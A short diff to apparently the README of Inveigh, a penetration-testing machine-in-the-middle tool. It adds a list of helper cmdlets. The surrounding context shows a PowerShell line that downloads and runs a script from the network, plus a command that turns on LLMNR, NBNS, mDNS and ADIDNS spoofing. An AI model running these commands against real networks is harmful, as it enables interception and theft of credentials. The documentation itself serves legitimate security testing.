@@ -6,6 +6,11 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 Invoke-Inveigh -ConsoleOutput Y -StatusOutput Y  -ADIDNS COMBO -NBNS Y -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory "C:\DIRECTORY" -LLMNR Y -mDNS Y
 ```
 
+Clear-Inveigh – clear the $inveigh hashtable   
+Get-Inveigh – get data from the $inveigh hashtable   
+Stop-Inveigh – stop all running Inveigh modules   
+Watch-Inveigh – enable real time console output   
+
 # Inveigh
 
 Inveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool for penetration testers. This repo contains the primary C# version as well as the legacy PowerShell version.  
